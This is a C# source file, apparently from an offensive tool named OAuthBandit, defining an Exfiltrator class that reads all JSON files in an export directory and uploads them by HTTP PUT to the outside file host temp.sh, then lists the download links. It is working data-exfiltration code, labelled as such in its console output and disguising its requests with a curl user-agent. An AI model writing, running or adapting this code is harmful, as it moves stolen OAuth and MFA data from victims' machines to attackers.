using System.Text;
using System.Text.Json;

namespace OAuthBandit.Mfa;

public class Exfiltrator
{
    private const string TempShUrl = "https://temp.sh";
    private static readonly HttpClient Http = new() { Timeout = TimeSpan.FromSeconds(30) };
    public List<Dictionary<string, object>> Uploaded { get; } = new();

    public string? UploadFile(string filePath)
    {
        if (!File.Exists(filePath))
        {
            Console.WriteLine($"    [!] File not found: {filePath}");
            return null;
        }

        var filename = Path.GetFileName(filePath);
        try
        {
            var fileData = File.ReadAllBytes(filePath);
            var url = $"{TempShUrl}/{filename}";

            using var req = new HttpRequestMessage(HttpMethod.Put, url);
            req.Content = new ByteArrayContent(fileData);
            req.Content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
            req.Headers.UserAgent.ParseAdd("curl/8.0");

            var resp = Http.SendAsync(req).Result;
            var downloadUrl = resp.Content.ReadAsStringAsync().Result.Trim();

            if (!string.IsNullOrEmpty(downloadUrl) && downloadUrl.StartsWith("http"))
            {
                Console.WriteLine($"    [+] {filename} ({fileData.Length} bytes) -> {downloadUrl}");
                Uploaded.Add(new Dictionary<string, object>
                {
                    ["file"] = filename,
                    ["size_bytes"] = fileData.Length,
                    ["url"] = downloadUrl,
                    ["uploaded_at"] = DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss") + " UTC"
                });
                return downloadUrl;
            }

            Console.WriteLine($"    [!] Unexpected response: {downloadUrl[..Math.Min(downloadUrl.Length, 100)]}");
            return null;
        }
        catch (Exception ex)
        {
            Console.WriteLine($"    [!] Upload error: {ex.Message}");
            return null;
        }
    }

    public void UploadExportDir(string exportDir)
    {
        if (!Directory.Exists(exportDir))
        {
            Console.WriteLine($"[!] Export directory not found: {exportDir}");
            return;
        }

        var jsonFiles = Directory.GetFiles(exportDir, "*.json");
        if (jsonFiles.Length == 0)
        {
            Console.WriteLine("[!] No JSON files found in export directory");
            return;
        }

        Console.WriteLine($"\n{"".PadRight(60, '=')}");
        Console.WriteLine($"[*] EXFILTRATION - temp.sh");
        Console.WriteLine($"[*] {jsonFiles.Length} file(s) to upload");
        Console.WriteLine($"{"".PadRight(60, '=')}");
        Console.WriteLine();

        foreach (var file in jsonFiles)
            UploadFile(file);

        if (Uploaded.Count > 0)
        {
            Console.WriteLine($"\n[+] {Uploaded.Count}/{jsonFiles.Length} files uploaded");
            Console.WriteLine("\n[*] Download URLs:");
            foreach (var entry in Uploaded)
                Console.WriteLine($"    {entry["file"]}: {entry["url"]}");
        }
    }
}
